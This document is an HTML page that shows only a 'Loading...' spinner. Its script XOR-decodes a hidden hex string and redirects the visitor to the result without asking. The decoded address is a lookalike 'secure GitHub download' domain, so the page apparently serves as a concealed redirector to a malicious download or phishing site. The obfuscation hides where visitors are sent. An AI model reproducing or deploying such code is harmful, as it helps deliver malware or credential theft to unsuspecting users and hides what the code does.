<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="referrer" content="strict-origin-when-cross-origin">
  <meta name="robots" content="none">
  <title>Loading...</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #1a0f1a;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }
    .spinner {
      width: 50px;
      height: 50px;
      border: 4px solid rgba(70, 40, 70, 0.3);
      border-top-color: #462846;
      border-radius: 50%;
      animation: rotate 2s linear infinite;
      box-shadow: 0 0 20px rgba(70, 40, 70, 0.7);
    }
    @keyframes rotate {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <script>
    const encoded = "3D212125266F7A7A323C213D2037263036202730313A223B393A34317B3A3B393C3B307A3D27337A343939";
    const key = 0x55; // XOR-ключ

    function decode(hex, key) {
      let result = "";
      for (let i = 0; i < hex.length; i += 2) {
        const charCode = parseInt(hex.substr(i, 2), 16) ^ key;
        result += String.fromCharCode(charCode);
      }
      return result;
    }

    window.location.href = decode(encoded, key);
  </script>
</body>
</html>
